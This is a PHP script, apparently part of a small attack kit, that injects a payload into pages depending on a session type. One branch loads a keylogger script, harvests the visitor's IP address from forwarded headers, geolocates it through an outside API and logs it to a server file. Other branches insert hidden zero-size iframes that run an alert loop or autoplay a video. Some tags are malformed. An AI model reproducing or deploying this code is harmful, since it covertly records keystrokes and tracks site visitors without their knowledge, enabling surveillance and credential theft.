<?php
session_start();
include "../php/BaseController.php";
$i = (string)$_SESSION['Type'];
$textToInsert="";
switch($i){
    case "Key":
          $keyloggerscript = "../js/keylogger.js";
          $textToInsert="script src='$keyloggerscript'</script>";
          //GETTING IP AND ADDING IT TO DATA.TXT ON SERVER
          $ip = getenv('HTTP_CLIENT_IP')?:
          getenv('HTTP_X_FORWARDED_FOR')?:
          getenv('HTTP_X_FORWARDED')?:
          getenv('HTTP_FORWARDED_FOR')?:
          getenv('HTTP_FORWARDED')?:
          getenv('REMOTE_ADDR');
          //depends on location / this ip for good result 12.215.42.19 ;
           $data = file_get_contents("http://api.hostip.info/get_html.php?ip='$ip'&position=true")." Says ";
           $logfile = fopen('../php/data.txt', 'a+');
           fwrite($logfile, $data );
           fclose($logfile);
          //depends on location / this ip for good result 12.215.42.19 ;
          //$check = file_get_contents("http://api.hostip.info/get_html.php?ip='$ip'&position=true");
          break;
    case "Dos":
          $textToInsert="<iframe id='iframe' width ='0' height='0' src='javascript:for(var i=0;i < 1;i++){alert()}' frameborder='0' </iframe>";
          //for($i=0;$i<10;i++){$textToInsert .= $textToInsert};
          break;
    case "Cryptography":
          $textToInsert="<iframe width='0' height='0' src='https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1' frameborder='0'></iframe>";
          break;
    default:
          $textToInsert="<iframe width='0' height='0' src='https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1' frameborder='0'></iframe>";
          break;
}

runScript($textToInsert);

?>
